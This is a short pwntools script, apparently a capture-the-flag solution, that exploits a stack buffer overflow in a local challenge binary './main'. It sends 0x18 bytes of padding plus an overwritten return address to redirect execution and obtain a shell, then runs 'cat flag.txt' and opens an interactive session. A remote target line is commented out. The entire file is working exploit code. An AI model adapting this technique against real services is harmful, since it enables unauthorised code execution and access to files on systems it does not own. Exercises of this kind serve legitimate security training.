from pwn import *


p=process("./main")
#p=remote("localhost",10001)

gdb.attach(p)
p.sendline(b"a"*0x18+p64(0x00000000004013fd))

# i got my shell now i get the flag
p.sendline("cat flag.txt")

p.interactive()